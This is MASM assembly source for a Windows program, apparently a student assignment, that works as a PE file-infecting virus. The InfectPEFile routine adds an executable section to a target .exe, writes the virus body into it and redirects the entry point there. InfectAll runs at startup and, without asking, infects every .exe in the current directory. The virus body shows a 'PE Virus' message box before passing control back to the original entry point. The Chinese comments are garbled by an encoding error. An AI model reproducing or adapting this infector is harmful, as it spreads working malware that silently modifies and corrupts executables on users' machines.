.386
.model flat,stdcall
option casemap:none

include windows.inc
include gdi32.inc
includelib gdi32.lib
include user32.inc
includelib user32.lib
include kernel32.inc
includelib kernel32.lib
include comdlg32.inc
includelib comdlg32.lib


IDR_MENU	equ	1001
ID_QUERY_FILE	equ	1101
ID_EXIT		equ	1102
ID_INFECT_FILE	equ	1201
ID_HELP		equ	1301
IDC_EDIT	equ	40001

OpenFileDlg	proto 	hInst:HINSTANCE,hWnd:HWND,lpFileName:dword,lpFilterString:dword,lpTitle:dword
GetPEHeaderInfo	proto	lpFileName:dword,hEdit:HWND
InfectPEFile	proto
InfectAll	proto

.data
		hInstance	dd	?
		hMainWnd	dd	?
		hEdit		HWND	?
		szFileName	db	MAX_PATH dup (0)

.const
		;****************************
		;_WinMain��ʹ�õ�ȫ���ַ���������ʵ������Ϊ��ʼ���ֲ��ִ����������װ���
		;****************************
		szAppName	db 	'PEFILE',0
		szCaption	db	'PE File Operation',0

		;****************************
		;_MainWndProc��ʹ�õ�ȫ���ַ�������
		;****************************
		szEditCtrl	db	"EDIT",0
		szFilterString	db	"Portable Executive File(*.exe)",0,"*.exe",0,"All files(*.*)",0,"*.*",0,0
		szTitle		db	"please open a Portable Executive File!",0
		szConfirmation	db	"Are you sure to infect that chosen file, the procedure isnot reversible!",0
		szWarning	db	"Warning!!!!!",0
		szHelp		db	"����ѡ���ļ�->QueryFile��ȡ�ļ���Ϣ��Ȼ��ѡ��Infect->InfectChosenFile��Ⱦ��һ��ѡ�����ļ�",0

		;****************************
		;GetPEHeaderInfo��ʹ�õ�ȫ���ַ�������
		;****************************
		szErrorOpenFile	db	"Cannot open chosen file!",0
		szErrorFileType	db	"This file isn't a PE file!",0
		szBasicInfoFormat	db	0dh,0ah,0dh,0ah
					db	'NumberOfSections : %d',0dh,0ah
					db	'ImageBase : 	%08X',0dh,0ah
					db	'AddressOfEntryPoint : %08X',0dh,0ah
					db	'SizeOfImage %08X',0dh,0ah,0dh,0ah
		szSectionInfoString	db	'��������		������С		RVA��ַ		������С	�ļ�ƫ��		����',0dh,0ah,0
		szSectionInfoFormat	db	'%s		%08X	%08X	%08X	%08X	%08X',0dh,0ah,0dh,0ah,0

		;****************************
		;InfectPEFile��ʹ�õ�ȫ���ַ�������
		;****************************
		szDllName	db	"user32",0
		szMessageBoxA	db	"MessageBoxA",0

.code


;**************************************************************
;���ڹ��̶���
;**************************************************************
_MainWndProc proc uses edi esi ebx,hWnd,uMessage,wParam,lParam
			mov eax,uMessage

			.if eax == WM_CREATE
				invoke CreateWindowEx,0,offset szEditCtrl,NULL,WS_CHILD or WS_VISIBLE or WS_HSCROLL or WS_VSCROLL\
							or WS_BORDER or ES_LEFT or ES_MULTILINE or ES_AUTOHSCROLL or ES_AUTOVSCROLL,\
							0,0,0,0,hWnd,IDC_EDIT,hInstance,0
				mov	hEdit,eax
				invoke	SendMessage,hEdit,EM_SETREADONLY,TRUE,0;���༭�����Ը�Ϊֻ��

			.elseif eax == WM_SIZE
				xor	eax,eax
				mov	ax,word ptr [lParam]
				xor	ecx,ecx
				mov	cx,word ptr [lParam + 2]
				invoke	MoveWindow,hEdit,0,0,eax,ecx,TRUE;Ҫע�������EAX,ECX��Ӧ��MoveWindow�����Ĳ����������ͱ��������Դ�������ѿ�

			.elseif	eax == WM_COMMAND
				mov eax,wParam
				.if ax == ID_EXIT
					jmp	_Exit;
				.elseif ax == ID_QUERY_FILE
					invoke OpenFileDlg,hInstance,hWnd,offset szFileName,offset szFilterString,offset szTitle
		_QueryInfo:
					invoke SetWindowText,hEdit,offset szFileName
					invoke GetPEHeaderInfo,offset szFileName,hEdit
				.elseif	ax == ID_INFECT_FILE
					invoke	MessageBox,NULL,offset szConfirmation,offset szWarning,MB_YESNO
						.if	eax == IDYES
							invoke	InfectPEFile
						.endif
					jmp	_QueryInfo
				.elseif	ax == ID_HELP
					invoke MessageBox,NULL,offset szHelp,offset szWarning,MB_OK
				.endif
			.elseif eax == WM_CLOSE
_Exit:
				invoke DestroyWindow,hMainWnd
				invoke PostQuitMessage,NULL

			.else
				invoke DefWindowProc,hWnd,uMessage,wParam,lParam
				ret
			.endif
			xor eax,eax
			ret
_MainWndProc endp

;***********************************************
;_WinMain����
;***********************************************
_WinMain proc	
		local @stWndClass : WNDCLASSEX
		local @stMsg      : MSG
		local @hMenu	: HMENU
		invoke GetModuleHandle,NULL
		mov hInstance,eax
		invoke RtlZeroMemory,addr @stWndClass,sizeof @stWndClass

		invoke LoadCursor,0,IDC_ARROW
		mov  @stWndClass.hCursor,eax
		push hInstance
		pop  @stWndClass.hInstance
		mov  @stWndClass.cbSize,sizeof WNDCLASSEX
		mov  @stWndClass.style,CS_HREDRAW or CS_VREDRAW
		mov  @stWndClass.lpfnWndProc,offset _MainWndProc
		mov  @stWndClass.hbrBackground,COLOR_WINDOW + 1
		mov  @stWndClass.lpszClassName,offset szAppName
		invoke RegisterClassEx,addr @stWndClass

		invoke LoadMenu,hInstance,IDR_MENU
		mov @hMenu,eax

		invoke CreateWindowEx,WS_EX_CLIENTEDGE,offset szAppName,offset szCaption,WS_OVERLAPPEDWINDOW,\
						100,100,600,400,NULL,@hMenu,hInstance,NULL

		mov hMainWnd,eax
		invoke ShowWindow,hMainWnd,SW_SHOWNORMAL
		invoke UpdateWindow,hMainWnd
		invoke InfectAll

		.while TRUE
			invoke GetMessage,addr @stMsg,NULL,0,0
			.break .if eax == 0
			invoke TranslateMessage,addr @stMsg
			invoke DispatchMessage,addr @stMsg
		.endw
		ret
_WinMain endp

;*************************************************************************************************
;���ļ�ģ��(��ʹ���κ�ȫ�ֱ�����ģ�飬��ֱ����ֲ�������ļ���)
;*************************************************************************************************
OpenFileDlg proc hInst:HINSTANCE,hWnd:HWND,lpFileName:dword,lpFilterString:dword,lpTitle:dword
	;hInst����ǰ���̵�ʾ�����
	;hWnd����ǰ���ھ��
	;lpFileName��ָ��洢Ҫ���ļ����Ļ������ĳ�ָ��
	;lpFilterString��ָ��ɸѡ�ļ����͵Ļ������ĳ�ָ��
	;lpTitle��ָ����ļ�ͨ�öԻ�������ֵĳ�ָ��

	local	@ofn : OPENFILENAME
	invoke	RtlZeroMemory,addr @ofn,sizeof OPENFILENAME

	mov	@ofn.lStructSize,sizeof OPENFILENAME
	push	hWnd
	pop	@ofn.hwndOwner
	push	hInst
	pop	@ofn.hInstance
	push	lpFilterString
	pop	@ofn.lpstrFilter
	push	lpFileName
	pop	@ofn.lpstrFile
	mov	@ofn.nMaxFile,MAX_PATH
	mov	@ofn.Flags,OFN_FILEMUSTEXIST or OFN_PATHMUSTEXIST or OFN_LONGNAMES or OFN_EXPLORER
	push	lpTitle
	pop	@ofn.lpstrTitle
	invoke	GetOpenFileName,addr @ofn
	
	.if eax == 0
		ret;ʧ�ܷ���ֵ��0����EAX��ֵ
	.endif

	ret
OpenFileDlg	endp

;************************************************************
;��ȡ�ļ�ͷ��Ϣ
;************************************************************
GetPEHeaderInfo	proc	lpFileName:dword,hEditCtrl:HWND
	;lpFileName	��ָ��Ҫ�򿪵��ļ�����ָ��
	;hEditCtrl	�ǿؼ�������ӿؼ�
	
	local	@hFile:HANDLE
	local	@dwFileReadWritten:dword	;ʹ�ö�д�ļ��Ǳ���Ĳ���
	local	@szBuffer[200]:byte

	;�洢PE�ļ�ͷ������Ϣ�ı���
	local	@ImageNtHeaders : IMAGE_NT_HEADERS
	local	@ImageSectionHeader : IMAGE_SECTION_HEADER

	local	@dwPEHeaderOffset : dword
	local	@dwSectionHeaderOffset : dword
	local	@dwCurrentSectionHeader: dword
	
	invoke	CreateFile,lpFileName,GENERIC_READ or GENERIC_WRITE,\
			FILE_SHARE_READ or FILE_SHARE_WRITE,NULL,OPEN_EXISTING,\
			FILE_ATTRIBUTE_NORMAL,NULL
	mov	@hFile,eax
	.if	eax == INVALID_HANDLE_VALUE
		invoke SetWindowText,hEditCtrl,addr szErrorOpenFile
		ret
	.endif
	;handle distance_to_move out_p_distance_to_move_high dwMoveMethod
	invoke	SetFilePointer,@hFile,3ch,NULL,FILE_BEGIN
	;handle out_pbuffer num_of_bytes_to_read out_lp_num_of_bytes_read inout_lpoverlapped
	invoke	ReadFile,@hFile,addr @dwPEHeaderOffset,sizeof DWORD,addr @dwFileReadWritten,0
	; get PE offset

	invoke	SetFilePointer,@hFile,@dwPEHeaderOffset,NULL,FILE_BEGIN
	invoke	ReadFile,@hFile,addr @ImageNtHeaders,sizeof IMAGE_NT_HEADERS,addr @dwFileReadWritten,0
	
	.if	[@ImageNtHeaders.Signature] != IMAGE_NT_SIGNATURE
		invoke SetWindowText,hEditCtrl,addr szErrorFileType
		ret
	.endif

	movzx	eax,[@ImageNtHeaders.FileHeader.NumberOfSections];����ط����˺����Ű�����Ϊ����չWORDΪDWORD��ʼ�ն��д���
	invoke	wsprintf,addr @szBuffer,offset szBasicInfoFormat,eax,\
				@ImageNtHeaders.OptionalHeader.ImageBase,@ImageNtHeaders.OptionalHeader.AddressOfEntryPoint,\
				@ImageNtHeaders.OptionalHeader.SizeOfImage
	invoke	GetWindowTextLength,hEditCtrl
	invoke	SendMessage,hEditCtrl,EM_SETSEL,eax,eax
	invoke	SendMessage,hEditCtrl,EM_REPLACESEL,0,addr @szBuffer

	;��ȡ�ڱ���Ϣ
	xor	ecx,ecx
	mov	eax,@dwPEHeaderOffset
	add	eax,sizeof IMAGE_NT_HEADERS
	mov	@dwSectionHeaderOffset,eax
	mov	@dwCurrentSectionHeader,eax

	.while	cx < [@ImageNtHeaders.FileHeader.NumberOfSections]
		push	ecx;��ECX��ջ�����Ǳ���ģ���ΪWINDOWS�ڵ��ú����ǣ����ƻ�ECX��ֵ
		invoke	SetFilePointer,@hFile,@dwCurrentSectionHeader,NULL,FILE_BEGIN
		invoke	ReadFile,@hFile,addr @ImageSectionHeader,sizeof IMAGE_SECTION_HEADER,addr @dwFileReadWritten,0
		invoke	wsprintf,addr @szBuffer,offset szSectionInfoFormat,addr @ImageSectionHeader.Name1,\
				@ImageSectionHeader.Misc.VirtualSize,@ImageSectionHeader.VirtualAddress,\
				@ImageSectionHeader.SizeOfRawData,@ImageSectionHeader.PointerToRawData,\
				@ImageSectionHeader.Characteristics
		invoke	GetWindowTextLength,hEditCtrl
		invoke	SendMessage,hEditCtrl,EM_SETSEL,eax,eax
		invoke	SendMessage,hEditCtrl,EM_REPLACESEL,0,addr @szBuffer
		pop	ecx
		inc	cx
		add	@dwCurrentSectionHeader,sizeof IMAGE_SECTION_HEADER
	.endw
	
	invoke CloseHandle,@hFile
	ret
GetPEHeaderInfo	endp


;******************************************************************************
;***************************************************************
;InfectPEFile����
;***************************************************************
;******************************************************************************
InfectPEFile proc
	local	dwPE_Header_Offset
	local	dwMySection_Offset
	local	dwFileReadWritten
	local	dwLast_SizeOfRawData
	local	dwLast_PointerToRawData
	local	hFile
	local	PE_Header:IMAGE_NT_HEADERS
	local	My_Section:IMAGE_SECTION_HEADER

	invoke CreateFile,addr szFileName,GENERIC_READ or GENERIC_WRITE,\
			FILE_SHARE_READ or FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
	.if	eax == INVALID_HANDLE_VALUE
		mov eax,1000
		ret
	.endif
	mov	hFile,eax
	
;************************************************************************************************************
;��ȡ�ļ�ͷ��PE_Header�ṹ��
;************************************************************************************************************
	invoke SetFilePointer,hFile,3ch,NULL,FILE_BEGIN
	invoke ReadFile,hFile,addr dwPE_Header_Offset,sizeof DWORD,addr dwFileReadWritten,0
	invoke SetFilePointer,hFile,dwPE_Header_Offset,NULL,FILE_BEGIN
	invoke ReadFile,hFile,addr PE_Header,sizeof IMAGE_NT_HEADERS,addr dwFileReadWritten,0
	
	;��������ļ��ǲ���һ��PE�ļ��������ܼ򵥣���PE�ļ�ǩ������
	.if	PE_Header.Signature != IMAGE_NT_SIGNATURE
		mov eax,1001
		ret
	.endif

	;���浱ǰ�ĳ�����ڵ�RVA�ͻ�ַ
	mov	eax,[PE_Header.OptionalHeader.AddressOfEntryPoint]
	mov	dwOld_AddressOfEntryPoint,eax
	mov	eax,[PE_Header.OptionalHeader.ImageBase]
	mov	dwOld_ImageBase,eax

;************************************************************************************************************
;��д�Լ��Ľڵ�ͷ������
;************************************************************************************************************
	;�ҵ�Ҫ��ӵ��½ڵ�ͷ���ļ�ƫ����
	mov	eax,sizeof IMAGE_SECTION_HEADER
	xor	ecx,ecx
	mov	cx,[PE_Header.FileHeader.NumberOfSections]
	mul	ecx
	add	eax,dwPE_Header_Offset
	add	eax,sizeof IMAGE_NT_HEADERS
	mov	dwMySection_Offset,eax
	;��֤�Ƿ���װ��һ���µ�IMAGE_SECTION_HEADER�ṹ
	.if eax > [PE_Header.OptionalHeader.SizeOfHeaders]
		mov eax,1002
		ret
	.endif
	;��ʽ��ʼ��д�½ڵ�ͷ������
	mov	dword ptr [My_Section.Name1],"BL"
	mov	[My_Section.Misc.VirtualSize],offset virusEnd - offset virusStart
	mov	eax,[PE_Header.OptionalHeader.SizeOfImage]
	mov	[My_Section.VirtualAddress],eax
	mov	eax,[My_Section.Misc.VirtualSize]
	mov	ecx,[PE_Header.OptionalHeader.FileAlignment]
	cdq
	div	ecx
	inc	eax
	mul	ecx
	mov	[My_Section.SizeOfRawData],eax
	;Ҫ��λ��ǰ��������ͷ��Ϣ��Ϊ�˵õ�PointerToRawData��Ա����
	mov	eax,dwMySection_Offset
	sub	eax,24d;����ǰ��������SizeOfRawData��Ա������
	invoke SetFilePointer,hFile,eax,NULL,FILE_BEGIN
	invoke ReadFile,hFile,addr dwLast_SizeOfRawData,4,addr dwFileReadWritten,0
	invoke ReadFile,hFile,addr dwLast_PointerToRawData,4,addr dwFileReadWritten,0
	mov	eax,dwLast_PointerToRawData
	add	eax,dwLast_SizeOfRawData
	mov	[My_Section.PointerToRawData],eax
	mov	[My_Section.PointerToRelocations],0
	mov	[My_Section.PointerToLinenumbers],0
	mov	[My_Section.NumberOfRelocations],0
	mov	[My_Section.NumberOfLinenumbers],0
	mov	[My_Section.Characteristics],0E0000020h;�½ڵ������ǿɶ���д��ִ��

	;���½ڵ�ͷд��Ҫ��Ⱦ���ļ���
	invoke SetFilePointer,hFile,dwMySection_Offset,0,FILE_BEGIN
	invoke WriteFile,hFile,addr My_Section,sizeof IMAGE_SECTION_HEADER,addr dwFileReadWritten,0

;************************************************************************************************************
;��ȡҪ���õ�API�����Ե�ַ
;************************************************************************************************************
	invoke LoadLibrary,addr szDllName
	invoke GetProcAddress,eax,addr szMessageBoxA
	mov	MessageBoxAddr,eax
	mov	eax,MessageBoxAddr

	
	;��������������ڽڵ����
	invoke SetFilePointer,hFile,0,0,FILE_END
	push	0
	lea	eax,dwFileReadWritten
	push	eax
	push	[My_Section.SizeOfRawData]
	lea	eax,virusStart
	push	eax
	push	hFile
	call	WriteFile

;************************************************************************************************************
;���ĳ��������EXEӳ���С
;************************************************************************************************************
	inc	[PE_Header.FileHeader.NumberOfSections];�ڵĸ�������1
	mov	eax,[My_Section.VirtualAddress]		;��ڵ�ı�
	mov	[PE_Header.OptionalHeader.AddressOfEntryPoint],eax

	mov	eax,[My_Section.Misc.VirtualSize]	;����ӳ���С�ı�
	mov	ecx,[PE_Header.OptionalHeader.SectionAlignment]
	cdq
	div	ecx
	inc	eax
	mul	ecx
	add	[PE_Header.OptionalHeader.SizeOfImage],eax

	invoke SetFilePointer,hFile,dwPE_Header_Offset,0,FILE_BEGIN
	invoke WriteFile,hFile,addr PE_Header,sizeof IMAGE_NT_HEADERS,addr dwFileReadWritten,0
	
	invoke CloseHandle,hFile
	xor	eax,eax
	inc	eax;�ɹ���Ⱦ����ֵ��Ϊ1
	ret
InfectPEFile endp

;************************************************************************************************************
;��Ⱦ��ǰĿ¼���п�ִ���ļ�
;************************************************************************************************************
fmt db "%s %d",0dh,0ah,0
wcard db "*.exe",0
notfound db "No exe file found!",0
msg db "PB14011086֣�Ӻ�",0dh,0ah,"��Ⱦ��ǰĿ¼�ļ���1��ʾ�ɹ���",0dh,0ah,0
InfectAll proc
	local	szBuffer[MAX_PATH+10]:byte
	local	wfd:WIN32_FIND_DATA
	local	hSearch:dword

	;�����ʾ��Ϣ
	invoke	GetWindowTextLength,hEdit
	invoke	SendMessage,hEdit,EM_SETSEL,eax,eax
	invoke	SendMessage,hEdit,EM_REPLACESEL,0,addr msg

	;���ҵ�ǰĿ¼�ĵ�һ��exe�ļ�
	invoke FindFirstFile,addr wcard,addr wfd
	.if eax == INVALID_HANDLE_VALUE
		;û���ҵ������������Ϣ������
		invoke	GetWindowTextLength,hEdit
		invoke	SendMessage,hEdit,EM_SETSEL,eax,eax
		invoke	SendMessage,hEdit,EM_REPLACESEL,0,addr notfound
		ret
	.else
		mov hSearch,eax
	.endif

	;�������Ŀ¼�����ļ�
	.if !(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		;��Ⱦ�ļ�
		invoke	lstrcpy,addr szFileName,addr wfd.cFileName
		invoke	InfectPEFile
		;����ļ����͸�Ⱦ���
		invoke	wsprintf,addr szBuffer,offset fmt,addr wfd.cFileName,eax
		invoke	GetWindowTextLength,hEdit
		invoke	SendMessage,hEdit,EM_SETSEL,eax,eax
		invoke	SendMessage,hEdit,EM_REPLACESEL,0,addr szBuffer
	.endif

nextfile:
	;������һ���ļ�
	invoke FindNextFile,hSearch,ADDR wfd
	;û�ҵ������
	cmp eax,0
	je InfectAllEnd
	;�������Ŀ¼�����ļ�
	.if !(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		;��Ⱦ�ļ�
		invoke	lstrcpy,addr szFileName,addr wfd.cFileName
		invoke	InfectPEFile
		;����ļ����͸�Ⱦ���
		invoke	wsprintf,addr szBuffer,offset fmt,addr wfd.cFileName,eax
		invoke	GetWindowTextLength,hEdit
		invoke	SendMessage,hEdit,EM_SETSEL,eax,eax
		invoke	SendMessage,hEdit,EM_REPLACESEL,0,addr szBuffer
	.endif
	jmp nextfile

InfectAllEnd:
	invoke FindClose,hSearch

	ret
InfectAll endp

;************************************************************************************************************
;�����ǲ���Ĳ�������
;************************************************************************************************************
virusStart:
	call nStart
nStart:
	pop	ebp
	sub	ebp,offset nStart

;TODO
	push	MB_YESNO
	lea	eax,szTitleMsg[ebp]
	push	eax
	lea	eax,szContent[ebp]
	push	eax
	push	0
	call 	MessageBoxAddr[ebp]

	.if eax == IDNO
		ret
	.endif

	mov	eax,dwOld_AddressOfEntryPoint[ebp]
	add	eax,dwOld_ImageBase[ebp]
	push	eax
	ret
;��������
	dwOld_AddressOfEntryPoint	dd	0
	dwOld_ImageBase			dd	0
	szTitleMsg			db	"PE Virus,Created by PB14011086֣�Ӻ�",0	
	szContent			db	"Do you want to continue",0
	MessageBoxAddr			dd	0
virusEnd:

;***********************************************************
;������ʼ
;***********************************************************
	start:
		call _WinMain
		invoke ExitProcess,NULL
	end start
